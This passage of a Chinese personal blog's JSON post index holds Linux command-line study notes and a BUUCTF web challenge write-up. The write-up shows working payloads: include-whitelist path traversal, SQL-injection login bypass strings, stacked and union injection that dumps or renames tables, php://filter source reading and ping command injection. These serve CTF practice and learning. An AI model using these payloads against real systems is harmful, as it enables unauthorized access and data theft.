cp命令的-R参数。可以用它在一条命令中递归地复制整个目录的内容。 2.3.3 移动和重命名文件在Linux中，重命名文件称为移动（ moving） 。 mv命令可以将文件和目录移动到另一个位置或重新命名。 # Moving a file \"into\" another file is how you rename files root@VM-16-11-debian:/tmp/test# mv test_file test_file1 root@VM-16-11-debian:/tmp/test# ls -F test2/ testdir/ test_file1 test_file2 # Move file into directory root@VM-16-11-debian:/tmp/test# mv test_file1 testdir/ root@VM-16-11-debian:/tmp/test# tree . ├── test2 │ ├── test_file │ └── test_file2 ├── testdir │ └── test_file1 └── test_file2 2 directories, 4 files 2.3.4 删除文件在Linux中，删除（ deleting）叫作移除（ removing） 。 bash shell中删除文件的命令是 rm。 -+ `rm &lt;filename&gt;` - 永久删除文件 -i命令参数提示你是不是要真的删除该文件 -r参数删除目录 root@VM-16-11-debian:/tmp/test/test2# rm -i test_file rm: remove regular empty file 'test_file'? y root@VM-16-11-debian:/tmp/test/test2# ls -l total 0 -rw-r--r-- 1 root root 0 Jan 16 15:35 test_file2 -r参数删除目录： root@VM-16-11-debian:/tmp/test# rm -r test2 root@VM-16-11-debian:/tmp/test# tree . ├── testdir │ └── test_file1 └── test_file2 1 directory, 2 files 2.4 处理目录2.4.1 创建目录$ mkdir New_Dir -p参数：同时创建多个目录和子目录 root@VM-16-11-debian:/tmp/test# mkdir -p test2/test3 root@VM-16-11-debian:/tmp/test# tree . ├── test2 │ └── test3 ├── testdir │ └── test_file1 └── test_file2 3 directories, 2 files 2.4.2 删除目录rmdir命令只删除空目录。 $ rmdir mydir root@VM-16-11-debian:/tmp/test# rmdir test2 rmdir: failed to remove 'test2': Directory not empty 2.5 查看文件2.5.1 查看文件类型在显示文件内容之前，应该先了解一下文件的类型。如果打开了一个二进制文件，你会在屏幕上看到各种乱码，甚至会把你的终端仿真器挂起。 $ file my_file root@VM-16-11-debian:/tmp/test# file testdir testdir: directory 2.5.2 查看整个文件cat &lt;filename&gt; - 打印文件 要将文件的内容快速转储到控制台，请使用cat. $ cat file1 -n参数会给所有的行加上行号。 -b参数会给只是文本的行加上行号。 The quick brown fox jumped over the lazy dog. more命令 cat命令的主要缺陷是：一旦运行，你就无法控制后面的操作。为了解决这个问题，开发人员编写了more命令。 more命令会显示文本文件的内容，但会在显示每页数据之后停下来。 可以通过按空格键或回车键以逐行向前的方式浏览文本文件。浏览完之后，按q键退出。 less命令 less &lt;filename&gt; - 显示和滚动文件 less如果您想查看一个不完全适合一个屏幕的长文件的内容，该程序很有用。要在运行后退出，请按 q。 你可以用更少的时间做很多其他的事情，但一件有用的事情是能够搜索。您可以搜索/banana以查找文件中“香蕉”的所有实例。 2.5.3 查看部分文件 tail命令tail命令会显示文件最后几行的内容（文件的“尾部”）。默认情况下，它会显示文件的末尾10行。 可以向tail命令中加入-n参数来修改所显示的行数: tail -2 text 。 head命令 head命令，顾名思义，会显示文件开头那些行的内容。默认情况下，它会显示文件前10行的文本。同理可以加入 -n 参数指定行数。 本章的学习就到这啦，下章将继续讨论bash shell的命令，并了解更多管理Linux系统时经常用到的高级系统管理命令。 文章参考：Linux命令行与shell脚本编程大全.第2版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"buuctf练习[1-10]","slug":"buuctf练习","date":"2022-01-15T07:03:43.000Z","updated":"2022-01-19T07:05:03.404Z","comments":true,"path":"posts/myh10004.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10004.html","excerpt":"","text":"1.[HCTF 2018]Warmup考察：php审计：mb_substr()+mb_strpos()绕过 打开题目地址后出现的是一个滑稽的表情，接着查看原码发现注释有 source.php ，访问后得到一段源码： &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; //白名单 if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) //需要同时满足三个条件：传入了file参数，并且是字符串，并且满足checkfile函数 ) { include $_REQUEST['file']; //执行给出的file参数值 exit; } else { echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; } ?&gt; flag{408cfb51-0d75-4976-9d2e-e431e5d0fd77} 先来介绍下两个函数mb_substr()+mb_strpos()： **mb_strpos()**：返回要查找的字符串在别一个字符串中首次出现的位置 mb_strpos( string $haystack, string $needle, ):int // haystack：要被检查的字符串。 // needle：要搜索的字符串 **mb_substr()** 函数返回字符串的一部分。 mb_substr( string $str, int $start, int $length = NULL, ):string //str 必需。从该 string 中提取子字符串。 //start 必需。规定在字符串的何处开始。 //ength 可选。规定要返回的字符串长度。默认是直到字符串的结尾 request() //可以以get或者post提交参数 include //文件包含,包含并运行文件中的内容 $_page . '?' //将$_page后拼接 ? public static function checkFile(&amp;$page) &amp;&amp; emmm::checkFile($_REQUEST['file']) 上面这代码表示 将request的file值 传入$page，其实就是将file参数传入到page中 &amp;引用传递变量。这是通过在函数内建立一个本地变量并且该变量在呼叫范围内引用了同一个内容来实现的。例如： &lt;?php function sub (&amp;$var) { $var++; } $num=5; sub($num); ?&gt; 将使 $num 变成 6。这是因为在 sub 函数中变量 $var 指向了和 $num 指向的同一个内容。 ​ 通过源码提示hin.php，访问之后得到flag在ffffllllaaaagggg中，所以我们肯定要使include包含这个文件，从而得到我们的flag。但是通过checkfile函数可知，返回true的条件是所传入的file参数值（或者是经过函数处理后的值）需要在白名单里，所以直接传入ffffllllaaaagggg肯定不得行。这是最终要的来啦，就是考虑题目给的函数，通过函数的处理的值使得我们能够返回true。所以构造payload为： 1.file=source.php?/../../../../../ffffllllaaaagggg 2.file=source.php%3f/../../../../../ffffllllaaaagggg //这里的%3f是 ? 经过ulr加密后的值，由于每次传参十，都会自动urldecode一次，所以等价于第一个 3.file=source.php%253f/../../../../../ffffllllaaaagggg //这里的%253f是 ? 经过两次ulr加密后的值，在经过一次自动处理以及checkfile函数里的urldecode函数处理一次后就等价于第一个了，同样可以返回true //说明一下../是返回上一级目录，首先在source.php?加一个 / ，使其成为不存在的目录，然后../就返回到source.php所在的目录，之后一次次试在哪个目录里，自己也可以在本地试试../的目录关系 之后传入payload就会得到flag啦~ 再补充一下 ./ ../ / 的说明： ./ 表示当前目录下 ../ 表示上一级目录 / 表示根目录 如图，以这个文件夹为例，在buu文件中，有2.png，那就表示为 ./buuctf练习/1.png 在此目录下，有hello.md，那就表示为： ./hello.md 或者 hello.md 如果2.png在上层目录的一个image文件下，那就是： ../image/1.png 2.[极客大挑战 2019]EasySQL根据题目提示是SQL注入，所以先试着判断注入点和引号闭合方式：在username输入：1’，密码随便输：1，出现语法报错： 则可以知道是单引号闭合，接着开始试试万能密码：1’ or 1=1# ,则输入后后台语句大致就是： select * from table_name where username='1' or 1=1 # ' and password='1' ; 由于#会把后面的都注释掉，所以就等价于： select * from table_name where username='1' or 1=1 可知 1=1 是个恒等式，所以就登陆成功了，得到flag~ 下面收集一些万能密码： 'or'='or' 'or 1=1-- ''or 1=1-- 'or'a'='a \"or \"a\"=\"a \"or\"=\"a'='a ')or('a'='a or 1=1-- a'or' 1=1-- \"or\"=\"a'='a 'or''=' 1 or '1'='1'=1 1 or '1'='1' or 1=1 'OR 1=1%00 \"or 1=1%00 'xor admin' or 'a'='a 密码随便 3.[极客大挑战 2019]Havefun这题还是比较简单的哈，进去之后就是一张可爱的猫猫图，有点乖哈哈，查看网页源代码，发现有一段PHP代码，就是get型参数传入： 然后构造payload为：http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dog就可以了~ 4.[ACTF2020 新生赛]Include从题目可以看出来考察的是文件包含，进入题目看到tip，点击，网页进行了跳转，此时发现url为： 可以看到后面有get型参数file值传入，此时传入参数后回显为这句话，那我们就直接通过==php://filter伪协议==读取整个flag.php，构造payload为： 可以看到有一串base64加密的编码，解密后得到flag： &lt;?php echo \"Can you find out the flag?\"; //flag{0f1d073a-d716-4aa6-ae19-16dbba744a1d} 5.[强网杯 2019]随便注从题目知应该是SQL注入，进入题目看到有一个输入框，输入 1 ，正常返回，加个单引号 1’ 返回SQL语句错误，即存在SQL注入 然后使用order by 2,order by 3 查看列数，发现只有两列 尝试使用联合查询union select 发现回显语是select被正则过滤了 emmm,开始大小写、联合注释等绕过waf,但是没得用就很气呦……，后来查了下资料原来是忽略掉的堆叠注入！，那就开始直接查看表名： 1';show tables; --+ //在SQL中，分号（;）是用来表示一条sql语句的结束。堆叠注入就是结束一个sql语句后，会继续执行下一条构造的SQL语句。 然后对应查看对应的列名： 1';show columns from words; --+ 1';show columns from `1919810931114514`; --+ //字符串为表名操作时要加反引号 这里可以看到我们要的flag是在对应的表中，根据第一次输入 1 的结果来看后台的语句应该是: select * from words where id = 所以我们目前最重要的就是从另一个表中获得数据，但是我们只能从 “word” 这个表里取数据，然后看了别人的文章发现还可以改表的名称来读flag! 所以，思路就很清晰了： 更改表的名称。将words改为随便其他的名字比如words1，然后将”1919810931114514”表的名字替换为words 给新的words表增加一列id 构造payload为（提醒： 字符串为表名操作时要加反引号！！！）： 1';rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; --+ //这里使用了rename和alert，具体用法可以查一下，不在正则过滤的范围内 //注意一定要使用反引号！ 接着再查看下表，其实就已经查出来flag了，啊tql，学到了~ 最后感谢有人复现让我学习：https://github.com/CTFTraining/qwb_2019_supersqli 6.[SUCTF 2019]EasySQL这题给我整不会了，刚开始试了联合不行，也没报错，报错注入也没了，布尔、时间也不得行了，又是看别人解题的一次，原来还可以猜后端代码:惊恐:。 select $_GET['query'] || flag from flag 然后构造payload为：*,1(或者其他常数) 我接着自己在本地的test数据库尝试了一下，直接构造： select 1 from salaries; 确实直接 select 一个常数会直接新增一个临时的列，并且每一行的数值都是这个常数，再来说一下这个 || ，在mysql里，只要 || 前面的成立，后面的便不再执行，同理，前面的不成立会执行后面的 。如果我们直接构造 : select *||salary from salaries 可以看到会报语法错误，所以最终就是大佬的构造方法： select *,1||salary from salaries 可以看到新增加了一列并且这个表中的数据也都显示出来了，大佬们牛批！最后解题拿flag： 7.[ACTF2020 新生赛]Exec考察的是远程命令执行，emm我也是第一次做这种题，百度了一下网站的ping漏洞，发现可能存在远程执行命令的漏洞，就开始尝试~ 首先讲几个知识点： 命令连接符 cmd1 ; cmd2 ; cmd3 分号 ; 可以进行多条命令的无关联执行，每一条执行结果不会影响其他命令的执行 cmd1 &amp;&amp; cmd2 左边的command1执行成功(返回0表示成功)后， &amp;&amp; 右边的command2才能被执行。 cmd1 | cmd2 | 表示管道，上一条命令的输出，作为下一条命令的输入 cmd1 || cmd2 || 表示上一条命令执行失败后，才执行下一条命令 下面开始做题： 首先ls查看一下当前目录有没有flag文件等，发现没得： 然后尝试遍历父目录可以看到有flag文件： 这样直接cat ../../../flag拿到flag: 8.[极客大挑战 2019]Secret File考察的是伪协议读取文件，难点就是怎么读到flag.php中的flag。 进入题目查看源代码发现提示有：/Archive_room.php ，接着点发现有：/action.php ，但是访问直接过去了跳到：/end.php，开始抓包： 发现有secr3t.php，访问之后看到一段代码： &lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){ echo \"Oh no!\"; exit(); } include($file); //flag放在了flag.php里 ?&gt; &lt;/html&gt; 直接访问flag.php会出现贱贱的话，看不到flag，看到php代码里有过滤的，先解释下这两个函数： strstr(string,search,before_search) 搜索字符串在另一字符串中的第一次出现。 返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 FALSE。 stristr(string,search,before_search) 不区分大小写的strstr（）版本。 看到过滤了input、data，是伪协议里的，那就考虑filter读取文件，构造payload: ?file=php://filter/read=convert.base64-encode/resource=flag.php 页面返回flag.php的源码，解密后看到flag：flag{b3f2f2c1-5e4f-4b48-8bc5-1cf85ef574b2} 9.[极客大挑战 2019]LoveSQL考察联合注入: 首先在username处输入1',password输个1，发现语法报错，即存在sql注入。接着先查看一下字段数： 1' order by 4 # 报错 1' order by 3 # 无报错，说明三个字段 然后试下联合查询爆破所有数据库： 1' union select 1,2,group_concat(schema_name) from information_schema.schemata # 看到有geek，大概率就是他了，接下来查看表名： 1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek' # 接着试试查看l0ve1ysq1表里的列名： 1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' # 最后就可以直接拿数据了： 1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1 # 得到flag{fbee60d0-759c-4012-a59b-bc0509fa5431}。 10.[GXYCTF2019]Ping Ping Ping又是一道命令执行漏洞的题目，不过存在了很多过滤，自己试了多种方法也不得行，看了一个师傅的博客学到了,tql，直接贴链接吧： https://blog.csdn.net/weixin_39190897/article/details/116247765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164256111016780274119167%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164256111016780274119167&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-116247765.pc_search_result_control_group&amp;utm_term=ping%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187 刷了十道题咧，哎，还是太菜了，不果慢慢有节奏了，慢慢学吧~","categories":[{"name":"CTF","slug":"CTF","permalink":"https://huhu-myh.github.io/categories/CTF/"}],"tags":[{"name":"buu练习","slug":"buu练习","permalink":"https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"}],"author":"myh"},{"title":"Linux学习-第一章","slug":"Linux学习-第一章","date":"2022-01-14T10:52:58.000Z","updated":"2022-01-17T08:17:52.641Z","comments":true,"path":"posts/myh10002.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10002.html","excerpt":"","text":"第一章：初识Linux1.1 shell​ Linux shell是一种特殊的交互式工具。它为用户提供了启动程序、管理文件系统中的文件以及运行在Linux系统上的进程的途径。 shell的核心是命令行提示符。命令行提示符是shell负责交互的部分。它允许你输入文本命令，然后解释命令，并在内核中执行。 ​ shell包含了一组内部命令，用这些命令可以完成诸如复制文件、移动文件、重命名文件、显示和终止系统中正运行的程序等操作。 shell也允许你在命令行提示符中输入程序的名称，它会将程序名传递给内核以启动它。 ​ 也可以将多个shell命令放入文件中作为程序执行，这些文件被称作shell脚本。你在命令行上执行的任何命令都可放进一个shell脚本中作为一组命令执行。这为创建那种需要把几个命令放在一起来工作的工具提供了便利。 ​ linux有好几种版本的shell，默认的是bash shell。 1.2 Linux系统分类​ Linux主要的系统可以分为两类：Debian和Redhat，话有一些其他的自由发布的版本。 ​ Debian系列主要有Debian、Ubuntu等。 ​ Redhat系列主要有Redhat、CentOs等。 ​ 不同的系统版本某些命令可能是不一样的，比如 Debian 使用 apt-get来安装包，但CentOs使用 yum。 第一张就是简要介绍一下什么是linux shell以及常见的发行版本。下一章，将详细讲解shell的使用。 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"渗透学习","slug":"渗透","date":"2022-01-14T05:30:01.000Z","updated":"2022-01-16T08:41:44.414Z","comments":true,"path":"posts/myh10001.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10001.html","excerpt":"","text":"","categories":[{"name":"网安","slug":"网安","permalink":"https://huhu-myh.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://huhu-myh.github.io/tags/%E6%B8%97%E9%80%8F/"}],"author":"myh"},{"title":"hello","slug":"hello","date":"2022-01-14T02:21:39.000Z","updated":"2022-01-20T08:58:56.851Z","comments":true,"path":"posts/myh10000.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10000.html","excerpt":"","text":"Day1hello，这是我的第一篇博客,以后这里会记录我的日常生活和学习! 大概更新的学习内容会有CTF，渗透，机器学习，python，Java的相关知识，期待您的来访~","categories":[{"name":"日常","slug":"日常","permalink":"https://huhu-myh.github.io/categories/%E6%97%A5%E5%B8%B8/"}],"tags":[{"name":"diary","slug":"diary","permalink":"https://huhu-myh.github.io/tags/diary/"}],"author":"myh"}],"categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"ASC","slug":"ASC","permalink":"https://huhu-myh.github.io/categories/ASC/"},{"name":"CTF","slug":"CTF","permalink":"https://huhu-myh.github.io/categories/CTF/"},{"name":"运维","slug":"运维","permalink":"https://huhu-myh.github.io/categories/%E8%BF%90%E7%BB%B4/"},{"name":"网安","slug":"网安","permalink":"https://huhu-myh.github.io/categories/%E7%BD%91%E5%AE%89/"},{"name":"日常","slug":"日常","permalink":"https://huhu-myh.github.io/categories/%E6%97%A5%E5%B8%B8/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"},{"name":"MPI","slug":"MPI","permalink":"https://huhu-myh.github.io/tags/MPI/"},{"name":"buu练习","slug":"buu练习","permalink":"https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"},{"name":"渗透","slug":"渗透","permalink":"https://huhu-myh.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"diary","slug":"diary","permalink":"https://huhu-myh.github.io/tags/diary/"}]}